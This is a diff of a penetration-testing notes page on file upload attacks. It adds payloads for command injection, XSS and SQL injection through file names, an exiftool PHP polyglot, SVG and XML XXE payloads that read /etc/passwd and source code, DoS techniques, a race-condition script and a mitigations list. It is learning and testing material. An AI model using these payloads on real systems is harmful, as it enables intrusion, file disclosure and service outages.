@@ -80,16 +80,34 @@
 * It is an internet standard that determines the type of a file through its general format and bytes structure.
 * File types always contain a specific sequence of bytes in their header or footer, [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)
 * eg -> JPEG -> `FF D8 FF` , GIF -> `GIF87a` or `GIF89a`
-* [ExifTool](https://exiftool.org/)
-  * Create a polyglot JPEG file containing malicious code within its metadata \*
-  * `exiftool -Comment="<?php echo 'START ' . file_get_contents('<path>') . ' END'; ?>"-i <input-image> -o <output-image>`
-  * Output between START and END strings
 
 ### Path Traversal Bypass
 
 * Restrictions on user-directory for permitted file types&#x20;
 * Change the directory where files are uploaded
 * Filename contains -> `../../exploit.php` (try encoding for ../../)
+
+### Injections in File Name <a href="#injections-in-file-name" id="injections-in-file-name"></a>
+
+* Use a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed (i.e., reflected) on the page.
+* **Payloads**: &#x20;
+  * OS command in the file name `file$(whoami).jpg` ,  ``file`whoami`.jpg`` , `file.jpg||whoami`
+  * XSS payload in the file name `<script>alert(window.origin);</script>`
+  * SQL query in the file name `file';select+sleep(5);--.jpg`&#x20;
+
+### Upload Directory Disclosure <a href="#upload-directory-disclosure" id="upload-directory-disclosure"></a>
+
+* We may utilize fuzzing to look for the uploads directory or even use other vulnerabilities (e.g., LFI/XXE) to find where the uploaded files are by reading the web applications source code.
+* Cause errors by uploading a file with a name that already exists or sending two identical requests simultaneously.
+* Upload a file with an overly long name (e.g., 5,000 characters)
+
+### Windows-specific Attacks <a href="#windows-specific-attacks" id="windows-specific-attacks"></a>
+
+* Using reserved characters, such as (`|`, `<`, `>`, `*`, or `?`), which are usually reserved for special uses like wildcards.
+* If the web application does not properly sanitize these names or wrap them within quotes, they may refer to another file (which may not exist) and cause an error that discloses the upload directory.
+* We may use Windows reserved names for the uploaded file name, like (`CON`, `COM1`, `LPT1`, or `NUL`), which may also cause an error as the web application will not be allowed to write a file with this name.
+* Older versions of Windows were limited to a short length for file names, so they used a Tilde character (`~`) to complete the file name. To refer to a file called (`hackthebox.txt`) we can use (`HAC~1.TXT`) or (`HAC~2.TXT`), where the digit represents the order of the matching files that start with (`HAC`)
+* Windows still supports this convention, we can write a file called (e.g. `WEB~1.CON`) to overwrite the `web.conf` file.
 
 ### Override Blacklist Extension&#x20;
 
@@ -104,61 +122,49 @@
 * Other server configuration locations
   * `/etc/apache2/mods-enabled/php7.4.conf`
 
-### Exploiting File Upload Race Conditions&#x20;
-
-* [race-conditions.md](race-conditions.md "mention")
-* Uploads the file to a temp directory and perform validation - virus checks etc&#x20;
-* Uploaded file is moved to an accessible folder, where checked for viruses.&#x20;
-* Malicious files are removed once the virus check completes&#x20;
-* Turbo Intruder extender required
-
-<details>
-
-<summary>Race Condition Code</summary>
-
-{% code lineNumbers="true" %}
-```python
-def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
-    request1 = '''<YOUR-POST-REQUEST>'''
-    request2 = '''<YOUR-GET-REQUEST>'''
-    
-    # the 'gate' argument blocks the final byte of each request until openGate is invoked
-    engine.queue(request1, gate='race1')
-    
-    for x in range(5):
-        engine.queue(request2, gate='race1')
-        # wait until every 'race1' tagged request is ready
-    	# then send the final byte of each request
-    	# (this method is non-blocking, just like queue)
-    
-    engine.openGate('race1')
-    engine.complete(timeout=60)
-
-def handleResponse(req, interesting):
-    table.add(req)
-```
-{% endcode %}
-
-</details>
-
 ### Malicious Client-Side Scripts
 
-* Upload HTML files or SVG images
-* Use tags to create stored XSS payloads
+* Upload HTML files or SVG images or XML
+* Use tags to create stored XSS payloads&#x20;
+* [ExifTool](https://exiftool.org/)
+  * Create a polyglot JPEG file containing malicious code within its metadata \*
+  * `exiftool -Comment="<?php echo 'START ' . file_get_contents('<path>') . ' END'; ?>"-i <input-image> -o <output-image>`  <sup><sub>(Output between START and END strings)<sub></sup>
+  * `exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' xss.jpg`  <sup><sub>(When the image's metadata is displayed, the XSS payload will be triggered or change the image's MIME-Type to<sub></sup> <sup><sub> </sup><sup><sub>`text/html`<sub></sup>  <sup><sub>  </sup><sup><sub>to render it as a HTML document)<sub></sup>
+* #### DoS Attacks <a href="#dos" id="dos"></a>
+  * **Decompression Bomb** - If a web application automatically unzips a ZIP archive, it is possible to upload a malicious archive containing nested ZIP archives within it, which can eventually lead to many Petabytes of data, resulting in a crash on the back-end server.
+  * **Pixel Flood** - We can create any `JPG` image file with any image size (e.g. `500x500`), and then manually modify its compression data to say it has a size of (`0xffff x 0xffff`), which results in an image with a perceived size of 4 Gigapixels. When the web application attempts to display the image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server.
 
 <details>
 
 <summary>SVG Payload</summary>
 
 {% code lineNumbers="true" %}
-```svg
+```xml
+<!-- XSS Payload -->
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-  <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
     <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
     <script type="text/javascript">alert("XSS");</script>
-  </svg>
+</svg>
+
+<!-- Alternate XSS Payload -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+    <script type="text/javascript">alert(window.origin);</script>
+</svg>
+
+<!-- XXE Payload -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+
+<!-- Alternate XXE Payload -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
 ```
 {% endcode %}
 
@@ -166,7 +172,7 @@ def handleResponse(req, interesting):
 
 <details>
 
-<summary>VBA Script</summary>
+<summary>VBA Script Payload</summary>
 
 {% code lineNumbers="true" %}
 ```vba
@@ -221,9 +227,38 @@ End Sub
 
 </details>
 
+<details>
+
+<summary>HTML Payload</summary>
+
+
+
+</details>
+
+<details>
+
+<summary>XML</summary>
+
+{% code lineNumbers="true" %}
+```xml
+<!-- XXE Payload -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+
+<!-- Alternate XXE Payload -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
+{% endcode %}
+
+</details>
+
 ### Exploiting Vulnerabilities in the Parsing of Uploaded Files&#x20;
 
-* Server parses XML-based files, such as Microsoft Office .doc or .xls files, this may be a potential vector for XXE injection attacks.
+* Server parses XML-based files, a potential vector for XXE injection attacks.
+* XML data is not unique to SVG images, as it is also utilized by many types of documents, like `PDF`, `Word Documents`, `PowerPoint Documents`, among many others.
 
 ### Uploading Files using PUT
 
@@ -244,15 +279,67 @@ Content-Length: 49
 
 </details>
 
+### Exploiting File Upload Race Conditions&#x20;
+
+* [race-conditions.md](race-conditions.md "mention")
+* Uploads the file to a temp directory and perform validation - virus checks etc&#x20;
+* Uploaded file is moved to an accessible folder, where checked for viruses.&#x20;
+* Malicious files are removed once the virus check completes&#x20;
+* Turbo Intruder extender required
+
+<details>
+
+<summary>Race Condition Code</summary>
+
+{% code lineNumbers="true" %}
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
+    request1 = '''<YOUR-POST-REQUEST>'''
+    request2 = '''<YOUR-GET-REQUEST>'''
+    
+    # the 'gate' argument blocks the final byte of each request until openGate is invoked
+    engine.queue(request1, gate='race1')
+    
+    for x in range(5):
+        engine.queue(request2, gate='race1')
+        # wait until every 'race1' tagged request is ready
+    	# then send the final byte of each request
+    	# (this method is non-blocking, just like queue)
+    
+    engine.openGate('race1')
+    engine.complete(timeout=60)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+{% endcode %}
+
+</details>
+
 ### PDF Injection
 
 {% file src="../../.gitbook/assets/xss2pdf.py" %}
 
-### Examples of attacks include:
+### Examples of attacks
 
 * Introducing other vulnerabilities like `XSS` or `XXE`.
 * Causing a `Denial of Service (DoS)` on the back-end server.
 * Overwriting critical system files and configurations.
 
-###
+### Mitigations
 
+* Extension Validation
+* Content Validation
+* Avoid Upload Directory Disclosure
+* `Content-Disposition`: Used to specify how the content should be displayed in the browser. Setting it to `attachment`
+* `Content-Type`: Specifies the MIME type of the file, ensuring that the browser knows how to handle the file content appropriately.
+* `X-Content-Type-Options: nosniff`: Prevents the browser from MIME-type sniffing, which helps mitigate security risks by ensuring that the browser adheres strictly to the specified `Content-Type`.
+* Randomize the names of the uploaded files in storage and store their "sanitized" original names in a database.
+* Store the uploaded files in a separate server or container.
+* `disable_functions` configuration in `php.ini` , add dangerous functions, like `exec`, `shell_exec`, `system`, `passthru`, and a few others.
+* Disable showing any system or server errors, to avoid sensitive information disclosure
+* Limit file size
+* Update any used libraries
+* Scan uploaded files for malware or malicious strings
+* Utilize a Web Application Firewall (WAF) as a secondary layer of protection
